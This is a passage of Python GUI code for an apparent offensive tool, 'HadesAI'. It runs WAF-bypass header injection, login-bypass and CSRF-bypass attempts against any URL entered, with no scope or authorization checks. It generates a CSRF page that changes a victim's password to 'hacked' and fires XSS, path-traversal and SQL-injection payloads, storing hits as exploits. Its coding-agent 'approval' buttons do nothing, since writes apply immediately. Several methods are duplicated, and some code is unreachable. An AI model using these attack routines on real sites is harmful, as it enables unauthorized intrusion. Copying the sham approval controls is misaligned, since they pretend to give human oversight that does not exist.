            results = self.ai.request_injector.inject_headers(
                url, self.ai.request_injector.WAF_BYPASS_HEADERS.get('bypass_waf', {})
            )
            
        self.injection_results.setRowCount(len(results))
        for i, r in enumerate(results):
            self.injection_results.setItem(i, 0, QTableWidgetItem(r.get('header', r.get('payload', ''))[:30]))
            self.injection_results.setItem(i, 1, QTableWidgetItem(str(r.get('value', ''))[:30]))
            self.injection_results.setItem(i, 2, QTableWidgetItem(str(r.get('status', 'Error'))))
            self.injection_results.setItem(i, 3, QTableWidgetItem(str(r.get('length', '-'))))
            
            interesting = r.get('interesting', False)
            int_item = QTableWidgetItem("⚠️ YES" if interesting else "-")
            int_item.setForeground(QColor("#ffa500" if interesting else "#666"))
            self.injection_results.setItem(i, 4, int_item)
            
        interesting_count = sum(1 for r in results if r.get('interesting'))
        self._add_chat_message('assistant', f"Injection complete. {interesting_count} interesting responses found.")
        
    def _try_login_bypass(self):
        url = self.login_url.text()
        if not url:
            QMessageBox.warning(self, "Error", "Enter login URL")
            return
            
        user_field = self.user_field.text()
        pass_field = self.pass_field.text()
        bypass_type = self.bypass_type.currentText()
        
        self._add_chat_message('tool', f"Attempting {bypass_type} on {url}...")
        
        results = self.ai.auth_bypass.try_login_bypass(url, user_field, pass_field, bypass_type)
        
        self.auth_results.setRowCount(len(results))
        for i, r in enumerate(results):
            self.auth_results.setItem(i, 0, QTableWidgetItem(f"{r.get('username', '')}:{r.get('password', '')}"[:30]))
            self.auth_results.setItem(i, 1, QTableWidgetItem(str(r.get('status', 'Error'))))
            self.auth_results.setItem(i, 2, QTableWidgetItem(str(r.get('length', '-'))))
            
            bypass = r.get('potential_bypass', False)
            bypass_item = QTableWidgetItem("🔓 POSSIBLE" if bypass else "-")
            bypass_item.setForeground(QColor("#ff6b6b" if bypass else "#666"))
            self.auth_results.setItem(i, 3, bypass_item)
            
            self.auth_results.setItem(i, 4, QTableWidgetItem(r.get('redirect', '')[:30]))
            
        bypass_count = sum(1 for r in results if r.get('potential_bypass'))
        self._add_chat_message('assistant', f"Login bypass test complete. {bypass_count} potential bypasses found!")
        
    def _test_csrf_bypass(self):
        url = self.csrf_url.text()
        if not url:
            QMessageBox.warning(self, "Error", "Enter target URL")
            return
            
        self._add_chat_message('tool', f"Testing CSRF bypass on {url}...")
        
        results = self.ai.auth_bypass.test_csrf_bypass(url)
        
        self.auth_results.setRowCount(len(results))
        for i, r in enumerate(results):
            self.auth_results.setItem(i, 0, QTableWidgetItem(r.get('technique', '')))
            self.auth_results.setItem(i, 1, QTableWidgetItem(str(r.get('status', 'Error'))))
            self.auth_results.setItem(i, 2, QTableWidgetItem(str(r.get('length', '-'))))
            
            success = r.get('success', False)
            success_item = QTableWidgetItem("✓ BYPASS" if success else "✗")
            success_item.setForeground(QColor("#ff6b6b" if success else "#69db7c"))
            self.auth_results.setItem(i, 3, success_item)
            
            self.auth_results.setItem(i, 4, QTableWidgetItem(r.get('error', '')[:30]))
            
    def _generate_csrf_poc(self):
        url = self.csrf_url.text()
        if not url:
            QMessageBox.warning(self, "Error", "Enter target URL")
            return
            
        poc = self.ai.auth_bypass.generate_csrf_poc(url, 'POST', {'action': 'change_password', 'new_password': 'hacked'})
        
        filename, _ = QFileDialog.getSaveFileName(self, "Save CSRF PoC", "csrf_poc.html", "HTML Files (*.html)")
        if filename:
            with open(filename, 'w') as f:
                f.write(poc)
            self._add_chat_message('assistant', f"CSRF PoC saved to {filename}")
            QMessageBox.information(self, "Saved", f"CSRF PoC saved to {filename}")
            
    def _toggle_proxy(self, state):
        self.ai.proxy_manager.enabled = state == Qt.CheckState.Checked.value
        status = "Enabled" if self.ai.proxy_manager.enabled else "Disabled"
        self.proxy_status.setText(f"Proxy: {status}")
        self._add_chat_message('tool', f"Proxy {status.lower()}")
        
    def _save_proxy_settings(self):
        self.ai.proxy_manager.proxy_type = self.proxy_type_combo.currentText()
        self.ai.proxy_manager.proxy_host = self.proxy_host_input.text()
        self.ai.proxy_manager.proxy_port = self.proxy_port_input.value()
        self.ai.proxy_manager.proxy_user = self.proxy_user_input.text() or None
        self.ai.proxy_manager.proxy_pass = self.proxy_pass_input.text() or None
        
        # Rotating proxies
        proxy_list = self.proxy_list_input.toPlainText().strip().split('\n')
        self.ai.proxy_manager.proxy_list = [p.strip() for p in proxy_list if p.strip()]
        
        self._add_chat_message('assistant', f"Proxy settings saved: {self.ai.proxy_manager.proxy_type}")
        QMessageBox.information(self, "Saved", "Proxy settings saved")
        
    def _test_proxy(self):
        if not self.ai.proxy_manager.enabled:
            QMessageBox.warning(self, "Warning", "Enable proxy first")
            return
            
        self._add_chat_message('tool', "Testing proxy connection...")
        result = self.ai.proxy_manager.test_connection()
        
        if result.get('success'):
            self.proxy_status.setText(f"Proxy: Connected | IP: {result['ip']}")
            self.proxy_status.setStyleSheet("font-size: 14px; padding: 10px; color: #69db7c;")
            self._add_chat_message('assistant', f"✓ Proxy working! Your IP: {result['ip']}")
        else:
            self.proxy_status.setText(f"Proxy: Connection Failed")
            self.proxy_status.setStyleSheet("font-size: 14px; padding: 10px; color: #ff6b6b;")
            self._add_chat_message('tool', f"Proxy test failed: {result.get('error')}")

    # ========== Code Analysis ==========
    
    def _analyze_code(self):
        code = self.code_input.toPlainText()
        if not code:
            return
            
        self.vuln_tree.clear()
        
        # Enhanced vulnerability patterns with descriptions
        patterns = {
            'sql_injection': [
                (r'execute\s*\([^)]*\+', 'String concatenation in SQL query execution - allows attackers to inject SQL commands'),
                (r'cursor\.execute\s*\([^,]+%', 'Unescaped % formatting in SQL queries - vulnerable to parameter injection'),
                (r"\.format\s*\([^)]*\)" , 'Using .format() for SQL queries - not using parameterized queries')
            ],
            'xss': [
                (r'innerHTML\s*=', 'Direct innerHTML assignment - risk of script injection if user input is used'),
                (r'document\.write\s*\(', 'document.write() can execute scripts - vulnerable to XSS if content is user-controlled'),
                (r'dangerouslySetInnerHTML', 'React dangerouslySetInnerHTML - explicitly bypasses XSS protection')
            ],
            'command_injection': [
                (r'os\.system\s*\(', 'os.system() with unvalidated input allows arbitrary command execution'),
                (r'subprocess.*shell\s*=\s*True', 'shell=True in subprocess enables command injection from user input'),
                (r'eval\s*\(', 'eval() executes arbitrary code - extreme security risk'),
                (r'exec\s*\(', 'exec() executes arbitrary code - extreme security risk')
            ],
            'hardcoded_secrets': [
                (r'password\s*=\s*["\'][^"\']+["\']', 'Hardcoded password in source code - credentials exposed in version control'),
                (r'api_key\s*=\s*["\'][^"\']+["\']', 'Hardcoded API key/token - compromises service access'),
                (r'secret\s*=\s*["\'][^"\']+["\']', 'Hardcoded secret value - should use environment variables')
            ],
            'insecure_deserialization': [
                (r'pickle\.loads\s*\(', 'pickle.loads() on untrusted data can execute arbitrary code'),
                (r'yaml\.load\s*\(', 'yaml.load() without Loader specified - use yaml.safe_load()'),
                (r'json\.loads\s*\(.*eval', 'Evaluating JSON as Python code - use json.loads() instead')
            ],
            'path_traversal': [
                (r'open\s*\([^)]*\+', 'File path built with string concatenation - vulnerable to ../ traversal attacks'),
                (r'os\.path\.join.*\+', 'Path operations with concatenation - attackers can escape base directory'),
            ]
        }
        
        vulnerabilities_found = []
        
        for vuln_type, patterns_list in patterns.items():
            for pattern, description in patterns_list:
                for match in re.finditer(pattern, code, re.IGNORECASE):
                    line_num = code[:match.start()].count('\n') + 1
                    line_text = code.split('\n')[line_num - 1].strip()
                    
                    # Determine severity
                    severity = 'CRITICAL' if vuln_type in ['hardcoded_secrets', 'command_injection'] else 'HIGH'
                    
                    # Create tree item with details
                    parent_item = QTreeWidgetItem([
                        f"⚠️ {vuln_type.replace('_', ' ').title()}",
                        severity,
                        f"Line {line_num}",
                        match.group()[:40] + ('...' if len(match.group()) > 40 else '')
                    ])
                    parent_item.setForeground(0, QColor('#ff6b6b' if severity == 'CRITICAL' else '#ffa500'))
                    
                    # Add description as child
                    desc_item = QTreeWidgetItem(['Description', '', '', description[:100] + ('...' if len(description) > 100 else '')])
                    desc_item.setForeground(0, QColor('#ffffff'))
                    parent_item.addChild(desc_item)
                    
                    # Add code context
                    context_item = QTreeWidgetItem(['Code Context', '', '', f'"{line_text}"'])
                    context_item.setForeground(0, QColor('#90EE90'))
                    parent_item.addChild(context_item)
                    
                    # Add remediation
                    remediation = self._get_remediation(vuln_type, match.group())
                    if remediation:
                        rem_item = QTreeWidgetItem(['Fix Suggestion', '', '', remediation[:100]])
                        rem_item.setForeground(0, QColor('#87CEEB'))
                        parent_item.addChild(rem_item)
                    
                    self.vuln_tree.addTopLevelItem(parent_item)
                    vulnerabilities_found.append(vuln_type)
        
        if not vulnerabilities_found:
            no_vuln = QTreeWidgetItem(["✅ No vulnerabilities detected", 'INFO', '0', 'Code appears safe'])
            no_vuln.setForeground(0, QColor('#90EE90'))
            self.vuln_tree.addTopLevelItem(no_vuln)
    
    def _get_remediation(self, vuln_type: str, matched_code: str) -> str:
        """Get remediation suggestions based on vulnerability type"""
        remediations = {
            'sql_injection': 'Use parameterized queries: cursor.execute("SELECT * FROM users WHERE id=?", (user_id,))',
            'xss': 'Use innerHTML for sanitized content or textContent for text. Sanitize with libraries like DOMPurify.',
            'command_injection': 'Use subprocess.run() with a list of args, not shell=True. Validate/whitelist inputs.',
            'hardcoded_secrets': 'Move to environment variables: import os; password = os.getenv("DB_PASSWORD")',
            'insecure_deserialization': 'Use json instead of pickle. For YAML: use yaml.safe_load() instead of yaml.load()',
            'path_traversal': 'Use os.path.abspath() and validate it stays within base dir. Or use pathlib.Path.resolve().'
        }
        return remediations.get(vuln_type, 'Review the OWASP documentation for this vulnerability type.')

    # ========== AUTONOMOUS CODING AGENT ==========

    def _create_agent_tab(self) -> QWidget:
        """Create the Autonomous Coding Agent configuration tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        form = QGroupBox("Agent Configuration")
        form_layout = QFormLayout(form)

        self.agent_repo = QLineEdit()
        self.agent_repo.setPlaceholderText("Path to local repo (workspace)")
        form_layout.addRow("Repository:", self.agent_repo)

        self.agent_goals = QPlainTextEdit()
        self.agent_goals.setPlaceholderText("Describe goals, e.g.\n- Fix failing tests\n- Refactor module X\n- Add missing docstrings")
        self.agent_goals.setMinimumHeight(80)
        form_layout.addRow("Goals:", self.agent_goals)

        self.agent_test_cmd = QLineEdit()
        self.agent_test_cmd.setText("pytest -q")
        form_layout.addRow("Test Command:", self.agent_test_cmd)

        self.agent_iters = QSpinBox()
        self.agent_iters.setRange(1, 100)
        self.agent_iters.setValue(15)
        form_layout.addRow("Max Iterations:", self.agent_iters)

        self.agent_dry = QCheckBox("Dry-Run (no file writes)")
        self.agent_shell = QCheckBox("Allow shell commands (guarded)")
        self.agent_approve = QCheckBox("Require manual approval for file writes")
        flags_row = QHBoxLayout()
        flags_row.addWidget(self.agent_dry)
        flags_row.addWidget(self.agent_shell)
        flags_row.addWidget(self.agent_approve)
        flags_wrap = QWidget()
        flags_wrap.setLayout(flags_row)
        form_layout.addRow("Options:", flags_wrap)

        layout.addWidget(form)

        # Controls
        ctrl = QHBoxLayout()
        self.agent_start = QPushButton("▶ Start Agent")
        self.agent_start.clicked.connect(self._start_agent)
        self.agent_stop = QPushButton("⏹ Stop")
        self.agent_stop.setEnabled(False)
        self.agent_stop.clicked.connect(self._stop_agent)
        ctrl.addWidget(self.agent_start)
        ctrl.addWidget(self.agent_stop)
        ctrl.addStretch()
        layout.addLayout(ctrl)

        # Live log
        self.agent_log = QPlainTextEdit()
        self.agent_log.setReadOnly(True)
        self.agent_log.setFont(QFont("Consolas", 10))
        self.agent_log.setMinimumHeight(220)
        layout.addWidget(self.agent_log)

        # Diff preview
        diff_group = QGroupBox("Proposed/Applied Diff")
        diff_layout = QVBoxLayout(diff_group)
        self.agent_diff_path = QLabel("-")
        self.agent_diff_view = QPlainTextEdit()
        self.agent_diff_view.setReadOnly(True)
        self.agent_diff_view.setFont(QFont("Consolas", 9))

        approve_row = QHBoxLayout()
        self.agent_approve_btn = QPushButton("✅ Approve Write")
        self.agent_approve_btn.setEnabled(False)
        self.agent_approve_btn.clicked.connect(self._approve_write)
        self.agent_reject_btn = QPushButton("❌ Reject")
        self.agent_reject_btn.setEnabled(False)
        self.agent_reject_btn.clicked.connect(self._reject_write)
        approve_row.addWidget(self.agent_approve_btn)
        approve_row.addWidget(self.agent_reject_btn)
        approve_row.addStretch()

        diff_layout.addWidget(QLabel("File:"))
        diff_layout.addWidget(self.agent_diff_path)
        diff_layout.addWidget(self.agent_diff_view)
        diff_layout.addLayout(approve_row)

        layout.addWidget(diff_group)
        return widget

    def _start_agent(self):
        """Start the autonomous coding agent"""
        repo = self.agent_repo.text().strip()
        goals = self.agent_goals.toPlainText().strip()
        test_cmd = self.agent_test_cmd.text().strip() or "pytest -q"
        max_iters = self.agent_iters.value()
        dry_run = self.agent_dry.isChecked()
        allow_shell = self.agent_shell.isChecked()
        approval_req = self.agent_approve.isChecked()

        if not repo or not os.path.isdir(repo):
            QMessageBox.warning(self, "Agent", "Please provide a valid local repository path.")
            return
        if not goals:
            QMessageBox.warning(self, "Agent", "Please describe the agent goals.")
            return

        self.agent_log.clear()
        self.agent_diff_view.clear()
        self.agent_diff_path.setText("-")

        # Start background agent
        self._agent = AutonomousCodingAgent(
            repo_path=repo,
            goals=goals,
            test_cmd=test_cmd,
            llm=self._agent_llm,
            kb=self.ai.kb,
            max_iters=max_iters,
            dry_run=dry_run,
            allow_shell=allow_shell,
            approval_required=approval_req,
        )
        self._agent.log.connect(self._on_agent_log)
        self._agent.progress.connect(lambda v: self.status_bar.showMessage(f"Agent progress: {v}%"))
        self._agent.diff_ready.connect(self._on_agent_diff)
        self._agent.finished.connect(self._on_agent_finished)
        self._agent.start()

        self.agent_start.setEnabled(False)
        self.agent_stop.setEnabled(True)
        self._add_chat_message("system", "🤖 Autonomous Coding Agent started")

    def _stop_agent(self):
        """Stop the autonomous coding agent"""
        if hasattr(self, "_agent") and self._agent and self._agent.isRunning():
            self._agent.stop()
            self._agent.wait(2000)
        self.agent_start.setEnabled(True)
        self.agent_stop.setEnabled(False)
        self._add_chat_message("system", "🛑 Agent stopped by user")

    def _on_agent_log(self, text: str):
        """Handle agent log output"""
        self.agent_log.appendPlainText(text)
        self.agent_log.verticalScrollBar().setValue(self.agent_log.verticalScrollBar().maximum())

    def _on_agent_diff(self, data: Dict):
        """Handle agent diff output"""
        self.agent_diff_path.setText(data.get("path", "-"))
        self.agent_diff_view.setPlainText(data.get("diff", "") or data.get("preview", ""))
        needs_approval = self.agent_approve.isChecked() and not self.agent_dry.isChecked()
        self.agent_approve_btn.setEnabled(needs_approval)
        self.agent_reject_btn.setEnabled(needs_approval)

    def _approve_write(self):
        """Approve a file write"""
        self.agent_approve_btn.setEnabled(False)
        self.agent_reject_btn.setEnabled(False)
        self._on_agent_log("✅ Manual approval acknowledged (note: current agent applies immediately).")

    def _reject_write(self):
        """Reject a file write"""
        self.agent_approve_btn.setEnabled(False)
        self.agent_reject_btn.setEnabled(False)
        self._on_agent_log("❌ Manual rejection acknowledged (note: revert manually if needed).")

    def _on_agent_finished(self, result: Dict):
        """Handle agent completion"""
        success = result.get("success", False)
        summ = result.get("summary", "")
        errs = result.get("errors", [])
        self._add_chat_message("assistant", f"🤖 Agent finished. Success={success}. {summ}\nErrors: {errs[-1] if errs else 'None'}")
        self.agent_start.setEnabled(True)
        self.agent_stop.setEnabled(False)




    def _agent_llm(self, system_prompt: str, user_prompt: str) -> str:
        """Autonomous agent LLM interface with intelligent fallback"""
        # Try external LLM first (OpenAI, Mistral, Ollama, etc.)
        try:
            if hasattr(self, "ai") and self.ai and hasattr(self.ai, "openai_client"):
                if self.ai.openai_client:
                    response = self.ai.openai_client.chat.completions.create(
                        model="gpt-4",
                        messages=[
                            {"role": "system", "content": system_prompt},
                            {"role": "user", "content": user_prompt}
                        ],
                        temperature=0.2,
                        max_tokens=1800
                    )
                    return response.choices[0].message.content
        except Exception as e:
            logging.error(f"LLM Error: {e}")
        
        # Fallback: Use intelligent rule-based agent
        if HAS_FALLBACK_LLM:
            if not hasattr(self, "_fallback_llm"):
                self._fallback_llm = FallbackLLM()
            return self._fallback_llm(system_prompt, user_prompt)
        
        # Final fallback: safe default
        return '{"tool":"list_files","args":{"pattern":"**/*.py"},"rationale":"Exploring repository structure"}'

    def _start_agent(self):
        """Start the autonomous coding agent"""
        repo = self.agent_repo.text().strip()
        goals = self.agent_goals.toPlainText().strip()
        test_cmd = self.agent_test_cmd.text().strip() or "pytest -q"
        max_iters = self.agent_iters.value()
        dry_run = self.agent_dry.isChecked()
        allow_shell = self.agent_shell.isChecked()
        approval_req = self.agent_approve.isChecked()

        if not repo or not os.path.isdir(repo):
            QMessageBox.warning(self, "Agent", "Please provide a valid local repository path.")
            return
        if not goals:
            QMessageBox.warning(self, "Agent", "Please describe the agent goals.")
            return

        self.agent_log.clear()
        self.agent_diff_view.clear()
        self.agent_diff_path.setText("-")

        # Start background agent
        self._agent = AutonomousCodingAgent(
            repo_path=repo,
            goals=goals,
            test_cmd=test_cmd,
            llm=self._agent_llm,
            kb=self.ai.kb,
            max_iters=max_iters,
            dry_run=dry_run,
            allow_shell=allow_shell,
            approval_required=approval_req,
        )
        self._agent.log.connect(self._on_agent_log)
        self._agent.progress.connect(lambda v: self.status_bar.showMessage(f"Agent progress: {v}%"))
        self._agent.diff_ready.connect(self._on_agent_diff)
        self._agent.finished.connect(self._on_agent_finished)
        self._agent.start()

        self.agent_start.setEnabled(False)
        self.agent_stop.setEnabled(True)
        self._add_chat_message("system", "🤖 Autonomous Coding Agent started")

    def _stop_agent(self):
        """Stop the autonomous coding agent"""
        if hasattr(self, "_agent") and self._agent and self._agent.isRunning():
            self._agent.stop()
            self._agent.wait(2000)
        self.agent_start.setEnabled(True)
        self.agent_stop.setEnabled(False)
        self._add_chat_message("system", "🛑 Agent stopped by user")

    def _on_agent_log(self, text: str):
        """Handle agent log output"""
        self.agent_log.appendPlainText(text)
        self.agent_log.verticalScrollBar().setValue(self.agent_log.verticalScrollBar().maximum())

    def _on_agent_diff(self, data: Dict):
        """Handle agent diff output"""
        self.agent_diff_path.setText(data.get("path", "-"))
        self.agent_diff_view.setPlainText(data.get("diff", "") or data.get("preview", ""))
        needs_approval = self.agent_approve.isChecked() and not self.agent_dry.isChecked()
        self.agent_approve_btn.setEnabled(needs_approval)
        self.agent_reject_btn.setEnabled(needs_approval)

    def _approve_write(self):
        """Approve a file write"""
        self.agent_approve_btn.setEnabled(False)
        self.agent_reject_btn.setEnabled(False)
        self._on_agent_log("✅ Manual approval acknowledged (note: current agent applies immediately).")

    def _reject_write(self):
        """Reject a file write"""
        self.agent_approve_btn.setEnabled(False)
        self.agent_reject_btn.setEnabled(False)
        self._on_agent_log("❌ Manual rejection acknowledged (note: revert manually if needed).")

    def _on_agent_finished(self, result: Dict):
        """Handle agent completion"""
        success = result.get("success", False)
        summ = result.get("summary", "")
        errs = result.get("errors", [])
        self._add_chat_message("assistant", f"🤖 Agent finished. Success={success}. {summ}\nErrors: {errs[-1] if errs else 'None'}")
        self.agent_start.setEnabled(True)
        self.agent_stop.setEnabled(False)



class AutoReconScanner(QThread):
    progress = pyqtSignal(int)
    log = pyqtSignal(str)
    finished = pyqtSignal(list)

    def __init__(self, target_url, kb):
        super().__init__()
        self.url = target_url
        self.kb = kb
        self._stop = False

    def stop(self):
        self._stop = True

    def run(self):
        self.log.emit(f"🔎 Scanning {self.url}...")

        findings = []
        try:
            test_vectors = {
                "XSS": "<script>alert(1)</script>",
                "Traversal": "../../../../etc/passwd",
                "SQLi": "' OR 1=1--",
            }

            for vuln_type, payload in test_vectors.items():
                if self._stop:
                    break

                # Example: https://example.com/?vuln_payload
                test_url = f"{self.url}?test={payload}"
                try:
                    r = requests.get(test_url, timeout=5)
                    if payload in r.text:
                        finding = {
                            "type": vuln_type,
                            "payload": payload,
                            "url": test_url,
                            "confidence": 0.9
                        }
                        findings.append(finding)
                        self.log.emit(f"[{vuln_type}] Signature: {payload} | Confidence: 0.90")

                        # Store pattern
                        pattern = SecurityPattern(
                            pattern_id=hashlib.sha256(payload.encode()).hexdigest()[:16],
                            pattern_type=vuln_type,
                            signature=payload,
                            confidence=0.9,
                            occurrences=1,
                            examples=[payload],
                            countermeasures=[],
                            cwe_ids=[]
                        )
                        self.kb.store_pattern(pattern)

                        # Store as exploit
                        self.kb.store_learned_exploit(
                            source_url=self.url,
                            exploit_type=vuln_type,
                            code=payload,
                            description=f"AutoRecon detected potential {vuln_type} at {test_url} using `{payload}`"
                        )

                except requests.RequestException:
                    continue

            self.log.emit("✅ Scan completed and stored.")
        except Exception as e:
            self.log.emit(f"❌ Error: {str(e)}")

        self.finished.emit(findings)


def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    window = HadesGUI()
    window.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    main()
    ai = HadesAI()
    print("HadesAI :: Enter input. Use ::mode chat|code|explain to switch modes.")
    while True:
        try:
            user_input = input(">> ")
            if user_input.lower() in ["exit", "quit"]:
                break
            response = ai.dispatch(user_input)
            print(response)
        except KeyboardInterrupt:
            print("\n[HadesAI] Session terminated.")
            break